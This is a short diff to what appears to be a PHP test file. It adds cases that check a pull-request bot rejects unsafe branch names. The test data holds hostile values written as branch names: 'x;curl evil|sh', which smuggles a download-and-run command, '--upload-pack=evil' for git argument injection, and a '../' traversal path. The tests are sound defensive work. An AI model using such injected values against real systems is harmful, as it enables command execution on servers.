@@ -128,6 +128,9 @@ it('refuses with a reply', function (array $pullRequest, bool $registered, bool 
     'fork' => [['head' => ['repo' => ['full_name' => 'someone/web']]], true, true, 'fork'],
     'closed PR' => [['state' => 'closed'], true, true, 'merged or closed'],
     'unsafe branch name' => [['head' => ['ref' => 'x;curl evil|sh']], true, true, 'branch name'],
+    'trailing newline' => [['head' => ['ref' => "feature/x\n"]], true, true, 'branch name'],
+    'leading dash' => [['head' => ['ref' => '--upload-pack=evil']], true, true, 'branch name'],
+    'double dot' => [['head' => ['ref' => 'a/../b']], true, true, 'branch name'],
 ]);
 
 it('queues behind a running task and says so', function () {
